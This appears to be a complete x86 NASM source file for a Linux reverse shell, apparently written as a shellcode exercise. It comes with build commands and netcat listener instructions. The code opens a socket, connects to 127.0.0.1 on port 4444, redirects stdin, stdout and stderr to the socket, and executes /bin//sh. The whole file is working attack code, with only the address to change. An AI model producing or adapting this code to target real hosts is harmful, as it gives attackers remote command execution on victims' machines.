
; filename: reverse_shell.nasm
; purpose: reverse shell in x86 assembly 
; to compile: nasm -f elf32 reverse_shell.nasm && ld -m elf_i386 reverse_shell.o -o reverse_shell
; when testing, use a netcat listener or something like nc -nvlp 4444

global _start

section .text
	_start:

	; set needed registers to zero, clear everything

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx



	; start of socket call

	mov bl, 2	; Setting AF_INET
	mov cl, 1	; Setting SOCK_STREAM
	mov dl, 6	; Setting protocol

	mov ax, 359	; syscall socket()

	int 0x80	; execute socket()


	; start of connect call

	mov ebx, eax	; putting sockfd socket value into ebx
	push 0x0101017f	; setting address to connect to as "127.0.0.1" onto the stack, need to change these nullbytes later
	push word 0x5c11	; setting the port to connect to as "4444" onto the stack
	push word 2		; setting "AF_INET" onto the stack
	
	mov ecx, esp	; put the memory address of the top of the stack into ecx, which will contain all the parameters needed for the connect syscall

	mov dl, 16	; size of the IP address

	mov ax, 362	; sycall connect()

	int 0x80	; execute connect()




	; start of dup2 looping call

	xor ecx, ecx
	mov cl, 3	; setting the counter to 3, by three file descriptors (as seen in actual C code: stdin, stdout, stderr)
	

	call_dup:
	
	xor eax, eax
	mov al, 63	; syscall dup2()
	dec ecx		; loop counter


	int 0x80	; execute dup2 each time

	inc ecx		; loop counter
	loop call_dup	; actually loop


	; start of execve call
	xor eax, eax
	xor edx, edx	
	push eax	; zero out top of stack
	push 0x68732f2f	; push the end of "/bin//sh"
	push 0x6e69622f	; push the beginning of "/bin//sh"

	mov ebx, esp	; put the pointer of "/bin//sh" on the stack into ebx

	mov al, 11	; sycall execve()

	int 0x80